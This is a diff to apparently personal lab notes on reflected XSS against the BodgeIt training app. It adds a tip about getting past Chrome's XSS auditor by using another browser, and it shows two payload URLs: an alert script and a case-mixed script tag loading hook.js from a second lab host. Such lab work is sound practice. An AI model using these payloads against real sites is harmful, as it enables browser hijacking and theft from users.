@@ -3,6 +3,9 @@
 
 ## Refelcted
 
+Got `ERR_BLOCKED_BY_XSS_AUDITOR` in your Chrome ? Try the `Iceweasel` in the VM ;]
+
+
 `http://10.6.6.13:8080/bodgeit/search.jsp?q=%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E`
 
 `http://10.6.6.13:8080/bodgeit/search.jsp?q=<sCrIpt src='http://10.6.6.13:3000/hook.js'></ScRipT>`
